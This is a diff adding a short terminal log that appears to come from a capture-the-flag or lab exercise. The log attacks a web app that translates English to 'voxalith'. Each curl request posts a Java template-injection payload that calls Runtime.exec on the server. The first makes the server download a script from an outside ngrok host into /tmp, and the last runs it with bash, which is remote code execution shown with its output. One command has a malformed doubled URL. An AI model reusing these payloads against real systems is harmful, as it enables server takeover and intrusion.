@@ -1,0 +1,14 @@
+❯ curl -s "http://94.237.54.30:53434/" -X POST -d "text=\$name.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"curl -s https://6541-186-121-196-149.ngrok-free.app/script.sh -o /tmp/script.sh \").getInputStream()" | html2text
+Enter text to translate english to voxalith!  
+  
+
+## java.lang.ProcessImpl$ProcessPipeInputStream@5cd02775
+
+❯ curl -s "http://http://94.237.54.30:53434//" -X POST -d "text=\$name.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"curl -s https://6541-186-121-196-149.ngrok-free.app/script.sh -o /tmp/script.sh \").getInputStream()" | html2text
+❯ curl -s "http://94.237.54.30:53434/" -X POST -d "text=\$name.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"bash /tmp/script.sh \").getInputStream()" | html2text
+Enter text to translate english to voxalith!  
+  
+
+## java.lang.ProcessImpl$ProcessPipeInputStream@2ff534ec
+
+
